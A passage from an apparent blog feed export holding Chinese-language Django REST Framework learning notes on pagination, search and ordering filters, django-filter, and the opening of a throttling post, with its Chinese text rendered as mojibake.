class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'cars/'</span>, views.CarListAPIView.as_view()),     <span class="comment"># åŸºç¡€åˆ†é¡µ</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListAPIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models, serializers, paginations</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºç¡€åˆ†é¡µ PageNumberPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># å¦‚æœquerysetæ²¡æœ‰è¿‡æ»¤æ¡ä»¶ï¼Œå°±å¿…é¡» .all()ï¼Œä¸ç„¶åˆ†é¡µä¼šå‡ºé—®é¢˜</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ†é¡µç»„ä»¶ - ç»™è§†å›¾ç±»é…ç½®åˆ†é¡µç±»å³å¯ - åˆ†é¡µç±»éœ€è¦è‡ªå®šä¹‰ï¼Œç»§æ‰¿drfæä¾›çš„åˆ†é¡µç±»å³å¯</span></span><br><span class="line">    pagination_class = paginations.MyPageNumberPagination</span><br><span class="line"></span><br><span class="line">    <span class="comment">#eg:/cars/  æ˜¾ç¤ºç¬¬ä¸€é¡µä¸‰æ¡</span></span><br><span class="line">    <span class="comment">#/cars/?page=2&amp;page_size=4   æ¯é¡µæ˜¾ç¤º4æ¡ï¼Œæ˜¾ç¤ºç¬¬äºŒé¡µçš„4æ¡</span></span><br></pre></td></tr></table></figure><h2 id="åç§»åˆ†é¡µç±»-LimitOffsetPagination"><a href="#åç§»åˆ†é¡µç±»-LimitOffsetPagination" class="headerlink" title="åç§»åˆ†é¡µç±» LimitOffsetPagination"></a>åç§»åˆ†é¡µç±» LimitOffsetPagination</h2><h3 id="urls-py-1"><a href="#urls-py-1" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars1/'</span>, views.CarListAPIView1.as_view()),     <span class="comment"># åç§»åˆ†é¡µ</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views-py-1"><a href="#views-py-1" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åç§»åˆ†é¡µ LimitOffsetPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView1</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># å¦‚æœquerysetæ²¡æœ‰è¿‡æ»¤æ¡ä»¶ï¼Œå°±å¿…é¡» .all()ï¼Œä¸ç„¶åˆ†é¡µä¼šå‡ºé—®é¢˜</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ†é¡µç»„ä»¶ - ç»™è§†å›¾ç±»é…ç½®åˆ†é¡µç±»å³å¯ - åˆ†é¡µç±»éœ€è¦è‡ªå®šä¹‰ï¼Œç»§æ‰¿drfæä¾›çš„åˆ†é¡µç±»å³å¯</span></span><br><span class="line">    pagination_class = paginations.MyLimitOffsetPagination</span><br></pre></td></tr></table></figure><h2 id="æ¸¸æ ‡åˆ†é¡µç±»-CursorPagination"><a href="#æ¸¸æ ‡åˆ†é¡µç±»-CursorPagination" class="headerlink" title="æ¸¸æ ‡åˆ†é¡µç±» CursorPagination"></a>æ¸¸æ ‡åˆ†é¡µç±» CursorPagination</h2><h3 id="urls-py-2"><a href="#urls-py-2" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars2/'</span>, views.CarListAPIView2.as_view()),   <span class="comment"># æ¸¸æ ‡åˆ†é¡µ</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views-py-2"><a href="#views-py-2" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ¸¸æ ‡åˆ†é¡µ CursorPagination</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView2</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># å¦‚æœquerysetæ²¡æœ‰è¿‡æ»¤æ¡ä»¶ï¼Œå°±å¿…é¡» .all()ï¼Œä¸ç„¶åˆ†é¡µä¼šå‡ºé—®é¢˜</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ†é¡µç»„ä»¶ - ç»™è§†å›¾ç±»é…ç½®åˆ†é¡µç±»å³å¯ - åˆ†é¡µç±»éœ€è¦è‡ªå®šä¹‰ï¼Œç»§æ‰¿drfæä¾›çš„åˆ†é¡µç±»å³å¯</span></span><br><span class="line">    pagination_class = paginations.MyCursorPagination</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆåå››ï¼‰ï¼šè¿‡æ»¤å™¨ç»„ä»¶</title>
      <link href="/tech/drf-learning-notes-14-filters/"/>
      <url>/tech/drf-learning-notes-14-filters/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (14): Filters</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZmlsdGVycy5weQ==">rest_framework.filters<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmlsdGVyaW5nLw==">DRF API Guild - Filtering<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9kamFuZ28tZmlsdGVyLnJlYWR0aGVkb2NzLmlvL2VuL3N0YWJsZS8=">django-filter<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzE0X2RyZl9maWx0ZXJzLw==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="DRFè¿‡æ»¤ç»„ä»¶"><a href="#DRFè¿‡æ»¤ç»„ä»¶" class="headerlink" title="DRFè¿‡æ»¤ç»„ä»¶"></a>DRFè¿‡æ»¤ç»„ä»¶</h1><h2 id="DRFæœç´¢è¿‡æ»¤ç»„ä»¶"><a href="#DRFæœç´¢è¿‡æ»¤ç»„ä»¶" class="headerlink" title="DRFæœç´¢è¿‡æ»¤ç»„ä»¶"></a>DRFæœç´¢è¿‡æ»¤ç»„ä»¶</h2><h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars/'</span>, views.CarListAPIView.as_view()),     <span class="comment"># SearchFilter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># drfçš„SearchFilter</span></span><br><span class="line"><span class="comment"># ç¬¬ä¸€æ­¥ï¼š æœç´¢è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer  <span class="comment">#è‡ªå®šä¹‰è®¤è¯</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¬¬äºŒæ­¥ï¼šå±€éƒ¨é…ç½® è¿‡æ»¤ç±» ä»¬ï¼ˆå…¨å±€é…ç½®ç”¨DEFAULT_FILTER_BACKENDSï¼‰</span></span><br><span class="line">    filter_backends = [SearchFilter]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¬¬ä¸‰æ­¥ï¼šSearchFilterè¿‡æ»¤ç±»ä¾èµ–çš„è¿‡æ»¤æ¡ä»¶ =&gt; æ¥å£ï¼š/cars/?search=...</span></span><br><span class="line">    search_fields = [<span class="string">'name'</span>, <span class="string">'price'</span>]  <span class="comment">#ç­›é€‰å­—æ®µ</span></span><br><span class="line">    <span class="comment"># egï¼š/cars/?search=1ï¼Œnameå’Œpriceä¸­åŒ…å«1çš„æ•°æ®éƒ½ä¼šè¢«æŸ¥è¯¢å‡º</span></span><br></pre></td></tr></table></figure><h2 id="DRFæ’åºè¿‡æ»¤ç»„ä»¶"><a href="#DRFæ’åºè¿‡æ»¤ç»„ä»¶" class="headerlink" title="DRFæ’åºè¿‡æ»¤ç»„ä»¶"></a>DRFæ’åºè¿‡æ»¤ç»„ä»¶</h2><h3 id="urls-py-1"><a href="#urls-py-1" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars2/'</span>, views.CarListAPIView2.as_view()),   <span class="comment"># OrderingFilter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="views-py-1"><a href="#views-py-1" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¬¬ä¸€æ­¥ï¼šdrfçš„OrderingFilter - æ’åºè¿‡æ»¤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> OrderingFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView2</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¬¬äºŒæ­¥ï¼šå±€éƒ¨é…ç½® è¿‡æ»¤ç±» ä»¬ï¼ˆå…¨å±€é…ç½®ç”¨DEFAULT_FILTER_BACKENDSï¼‰</span></span><br><span class="line">    filter_backends = [OrderingFilter]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¬¬ä¸‰æ­¥ï¼šOrderingFilterè¿‡æ»¤ç±»ä¾èµ–çš„è¿‡æ»¤æ¡ä»¶ =&gt; æ¥å£ï¼š/cars/?ordering=...</span></span><br><span class="line">    ordering_fields = [<span class="string">'pk'</span>, <span class="string">'price'</span>]</span><br><span class="line">    <span class="comment"># egï¼š/cars/?ordering=-price,pkï¼Œå…ˆæŒ‰priceé™åºï¼Œå¦‚æœå‡ºç°priceç›¸åŒï¼Œå†æŒ‰pkå‡åº</span></span><br></pre></td></tr></table></figure><h1 id="è‡ªå®šä¹‰è¿‡æ»¤å™¨"><a href="#è‡ªå®šä¹‰è¿‡æ»¤å™¨" class="headerlink" title="è‡ªå®šä¹‰è¿‡æ»¤å™¨"></a>è‡ªå®šä¹‰è¿‡æ»¤å™¨</h1><h2 id="urls-py-2"><a href="#urls-py-2" class="headerlink" title="urls.py"></a>urls.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars3/'</span>, views.CarListAPIView3.as_view()),   <span class="comment"># è‡ªå®šä¹‰fitler</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="filters-py"><a href="#filters-py" class="headerlink" title="filters.py"></a>filters.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œæ¥å£ï¼š?limit=æ˜¾ç¤ºçš„æ¡æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LimitFilter</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter_queryset</span><span class="params">(self, request, queryset, view)</span>:</span></span><br><span class="line">        <span class="comment"># å‰å°å›ºå®šç”¨ ?limit=... ä¼ é€’è¿‡æ»¤å‚æ•°</span></span><br><span class="line">        limit = request.query_params.get(<span class="string">'limit'</span>)</span><br><span class="line">        <span class="keyword">if</span> limit:</span><br><span class="line">            limit = int(limit)</span><br><span class="line">            <span class="keyword">return</span> queryset[:limit]</span><br><span class="line">        <span class="keyword">return</span> queryset</span><br></pre></td></tr></table></figure><h2 id="views-py-2"><a href="#views-py-2" class="headerlink" title="views.py"></a>views.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è‡ªå®šä¹‰fitler</span></span><br><span class="line"><span class="keyword">from</span> .filters <span class="keyword">import</span> LimitFilter</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView3</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># å¦‚æœquerysetæ²¡æœ‰è¿‡æ»¤æ¡ä»¶ï¼Œå°±å¿…é¡» .all()ï¼Œä¸ç„¶åˆ†é¡µä¼šå‡ºé—®é¢˜</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å±€éƒ¨é…ç½® è¿‡æ»¤ç±» ä»¬ï¼ˆå…¨å±€é…ç½®ç”¨DEFAULT_FILTER_BACKENDSï¼‰</span></span><br><span class="line">    filter_backends = [LimitFilter]</span><br></pre></td></tr></table></figure><h1 id="è¿‡æ»¤å™¨æ’ä»¶-django-filter"><a href="#è¿‡æ»¤å™¨æ’ä»¶-django-filter" class="headerlink" title="è¿‡æ»¤å™¨æ’ä»¶ django-filter"></a>è¿‡æ»¤å™¨æ’ä»¶ django-filter</h1><h2 id="urls-py-3"><a href="#urls-py-3" class="headerlink" title="urls.py"></a>urls.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">     path(<span class="string">'cars4/'</span>, views.CarListAPIView4.as_view()),   <span class="comment"># æ’ä»¶django-filter</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="filters-py-1"><a href="#filters-py-1" class="headerlink" title="filters.py"></a>filters.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># django-fitleræ’ä»¶ï¼šè‡ªå®šä¹‰è¿‡æ»¤å­—æ®µ</span></span><br><span class="line"><span class="keyword">from</span> django_filters <span class="keyword">import</span> filters</span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework.filterset <span class="keyword">import</span> FilterSet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarFilterSet</span><span class="params">(FilterSet)</span>:</span></span><br><span class="line">    min_price = filters.NumberFilter(field_name=<span class="string">'price'</span>, lookup_expr=<span class="string">'gte'</span>)</span><br><span class="line">    max_price = filters.NumberFilter(field_name=<span class="string">'price'</span>, lookup_expr=<span class="string">'lte'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Car</span><br><span class="line">        fields = [<span class="string">'brand'</span>, <span class="string">'min_price'</span>, <span class="string">'max_price'</span>]</span><br><span class="line">        <span class="comment"># brandæ˜¯modelä¸­å­˜åœ¨çš„å­—æ®µï¼Œä¸€èˆ¬éƒ½æ˜¯å¯ä»¥ç”¨äºåˆ†ç»„çš„å­—æ®µ</span></span><br><span class="line">        <span class="comment"># min_priceã€max_priceæ˜¯è‡ªå®šä¹‰å­—æ®µï¼Œéœ€è¦è‡ªå·±è‡ªå®šä¹‰è¿‡æ»¤æ¡ä»¶</span></span><br></pre></td></tr></table></figure><h2 id="views-py-3"><a href="#views-py-3" class="headerlink" title="views.py"></a>views.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># django-filteræ’ä»¶è¿‡æ»¤å™¨</span></span><br><span class="line"><span class="keyword">from</span> django_filters.rest_framework <span class="keyword">import</span> DjangoFilterBackend</span><br><span class="line"><span class="keyword">from</span> .filters <span class="keyword">import</span> CarFilterSet</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CarListAPIView4</span><span class="params">(ListAPIView)</span>:</span></span><br><span class="line">    queryset = models.Car.objects.all()</span><br><span class="line">    serializer_class = serializers.CarModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å±€éƒ¨é…ç½® è¿‡æ»¤ç±» ä»¬ï¼ˆå…¨å±€é…ç½®ç”¨DEFAULT_FILTER_BACKENDSï¼‰</span></span><br><span class="line">    filter_backends = [DjangoFilterBackend]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># django-filterè¿‡æ»¤å™¨æ’ä»¶ä½¿ç”¨</span></span><br><span class="line">    <span class="comment">#filter_class = CarFilterSet</span></span><br><span class="line">    filterset_class = CarFilterSet  <span class="comment"># æ—§ç‰ˆå†™ä½œfilter_class, æ–°ç‰ˆå†™ä½œfitlerset_class</span></span><br><span class="line">    <span class="comment"># æ¥å£ï¼š?brand=...&amp;min_price=...&amp;max_price=...</span></span><br><span class="line">    <span class="comment"># eg:?brand=å®é©¬&amp;min_price=5&amp;max_price=10 =&gt; 5~10é—´çš„å®é©¬ç‰Œæ±½è½¦</span></span><br></pre></td></tr></table></figure><h1 id="æ‰©å±•é˜…è¯»"><a href="#æ‰©å±•é˜…è¯»" class="headerlink" title="æ‰©å±•é˜…è¯»"></a>æ‰©å±•é˜…è¯»</h1><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHVDaGVuZ05vdGVzL3AvMTIwMTk3NzQuaHRtbA==">drf è¿‡æ»¤å™¨ç»„ä»¶ä¸è‡ªå®šä¹‰è¿‡æ»¤å™¨<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆåä¸‰ï¼‰ï¼šé¢‘ç‡ç»„ä»¶</title>
      <link href="/tech/drf-learning-notes-13-throttle/"/>
      <url>/tech/drf-learning-notes-13-throttle/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (13): Throttle</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdGhyb3R0bGluZy5weQ==">rest_framework.throttling<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdGhyb3R0bGluZy8=">API Guild - Throttling<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEzX2RyZl90aHJvdHRsZS8=">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="å…¥å£"><a href="#å…¥å£" class="headerlink" title="å…¥å£"></a>å…¥å£</h2><p>ä»<code>rest_framework.views.APIView</code>çš„<code>dispath(self, request, *args, **kwargs)</code>ä¸‹æ‰‹<br>ï¼Œ<code>dispath</code>æ–¹æ³•å†… <code>self.initial(request, *args, **kwargs)</code> è¿›å…¥ä¸‰å¤§è®¤è¯</p><ul><li>è®¤è¯ç»„ä»¶ <code>self.perform_authentication(request)</code><ul><li>æ ¡éªŒç”¨æˆ·ï¼šæ¸¸å®¢ã€åˆæ³•ç”¨æˆ·ã€éæ³•ç”¨æˆ·</li><li>æ¸¸å®¢ï¼šä»£è¡¨æ ¡éªŒé€šè¿‡ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆæƒé™æ ¡éªŒï¼‰</li><li>åˆæ³•ç”¨æˆ·ï¼šä»£è¡¨æ ¡éªŒé€šè¿‡ï¼Œå°†ç”¨æˆ·å­˜å‚¨åœ¨<code>request.user</code>ä¸­ï¼Œå†è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆæƒé™æ ¡éªŒï¼‰</li><li>éæ³•ç”¨æˆ·ï¼šä»£è¡¨æ ¡éªŒå¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›403æƒé™å¼‚å¸¸ç»“æœ</li></ul></li><li>æƒé™ç»„ä»¶ <code>self.check_permissions(request)</code><ul><li>æ ¡éªŒç”¨æˆ·æƒé™ï¼šå¿…é¡»ç™»å½•ã€æ‰€æœ‰ç”¨æˆ·ã€ç™»å½•ä¹‹åè¯»å†™ï¼Œæ¸¸å®¢åªè¯»ã€è‡ªå®šä¹‰ç”¨æˆ·è§’è‰²</li><li>è®¤è¯é€šè¿‡ï¼šå¯ä»¥è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆé¢‘ç‡è®¤è¯ï¼‰</li><li>è®¤è¯å¤±è´¥ï¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›403æƒé™å¼‚å¸¸ç»“æœ</li></ul></li><li>é¢‘ç‡ç»„ä»¶ <code>self.check_throttles(request)</code><ul><li>é™åˆ¶è§†å›¾æ¥å£è¢«è®¿é—®çš„é¢‘ç‡æ¬¡æ•° - é™åˆ¶çš„æ¡ä»¶(IPã€idã€å”¯ä¸€é”®)ã€é¢‘ç‡å‘¨æœŸæ—¶é—´(sã€mã€h)ã€é¢‘ç‡çš„æ¬¡æ•°ï¼ˆ3/sï¼‰</li><li>æ²¡æœ‰è¾¾åˆ°é™æ¬¡ï¼šæ­£å¸¸è®¿é—®æ¥å£</li><li>è¾¾åˆ°é™æ¬¡ï¼šé™åˆ¶æ—¶é—´å†…ä¸èƒ½è®¿é—®ï¼Œé™åˆ¶æ—¶é—´è¾¾åˆ°åï¼Œå¯ä»¥é‡æ–°è®¿é—®</li></ul></li></ul><p>æœ¬æ–‡ä»‹æƒé™ç»„ä»¶ã€‚</p><h2 id="views-APIView-initial"><a 